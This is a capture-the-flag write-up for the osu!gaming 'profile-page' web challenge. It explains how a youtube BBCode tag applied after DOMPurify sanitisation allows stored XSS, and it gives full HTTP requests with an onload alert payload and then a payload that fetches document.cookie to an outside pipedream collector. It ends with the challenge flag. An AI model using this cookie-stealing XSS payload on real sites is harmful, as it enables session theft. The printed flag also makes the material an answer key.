Web Challenge: profile-page


customize your osu! profile page!

https://profile-page.web.osugaming.lol/

https://adminbot.web.osugaming.lol/profile-page


------------------------------------------------------


1. First register account
2. Looking at source code we can go to /api/update if we include our accoutns csrf token and bio with a string.
3. Now we need to find the XSS.

4. Vulnerable code allowing iframe for youtube links
```css   
const window = new JSDOM('').window;
const purify = DOMPurify(window);
const renderBBCode = (data) => {
    data = data.replaceAll(/\[b\](.+?)\[\/b\]/g, '<strong>$1</strong>');
    data = data.replaceAll(/\[i\](.+?)\[\/i\]/g, '<i>$1</i>');
    data = data.replaceAll(/\[u\](.+?)\[\/u\]/g, '<u>$1</u>');
    data = data.replaceAll(/\[strike\](.+?)\[\/strike\]/g, '<strike>$1</strike>');
    data = data.replaceAll(/\[color=#([0-9a-f]{6})\](.+?)\[\/color\]/g, '<span style="color: #$1">$2</span>');
    data = data.replaceAll(/\[size=(\d+)\](.+?)\[\/size\]/g, '<span style="font-size: $1px">$2</span>');
    data = data.replaceAll(/\[url=(.+?)\](.+?)\[\/url\]/g, '<a href="$1">$2</a>');
    data = data.replaceAll(/\[img\](.+?)\[\/img\]/g, '<img src="$1" />');
    return data;
};
const renderBio = (data) => {
    const html = renderBBCode(data);
    const sanitized = purify.sanitize(html);
    // do this after sanitization because otherwise iframe will be removed
    return sanitized.replaceAll(
        /\[youtube\](.+?)\[\/youtube\]/g,
        '<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'
    );
};
```
First HTTP Post request I used to find XSS

POST /api/update HTTP/1.1
Host: profile-page.web.osugaming.lol
Cookie: csrf=2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e; connect.sid=s%3AtP70J1oyDiyJLQRLSKFO3WtGibgM8Yhv.baLOkGt4cn7e6ig3lqUrmdvd%2FzKyxSycPkuGFQUUZ6c
Content-Length: 86
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://profile-page.web.osugaming.lol
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://profile-page.web.osugaming.lol/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close
csrf: 2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e

bio= [youtube]https://www.youtube.com/embed/abcd" onload="alert('XSS')[/youtube]



5. After finding XSS I used RequestBin to catch http request



POST /api/update HTTP/1.1
Host: profile-page.web.osugaming.lol
Cookie: csrf=2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e; connect.sid=s%3AtP70J1oyDiyJLQRLSKFO3WtGibgM8Yhv.baLOkGt4cn7e6ig3lqUrmdvd%2FzKyxSycPkuGFQUUZ6c
Content-Length: 136
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://profile-page.web.osugaming.lol
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://profile-page.web.osugaming.lol/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close
csrf: 2a04810c7881e057d037ca499a490fe8bff478dce24ea028376470fb600d214e

bio=[youtube]https://www.youtube.com/embed/abcd" onload="fetch('https://eo43q419hz95h4j.m.pipedream.net?'%2Bdocument.cookie)[/youtube]



Flag: osu{but_all_i_w4nted_to_do_was_w4tch_y0utube...}
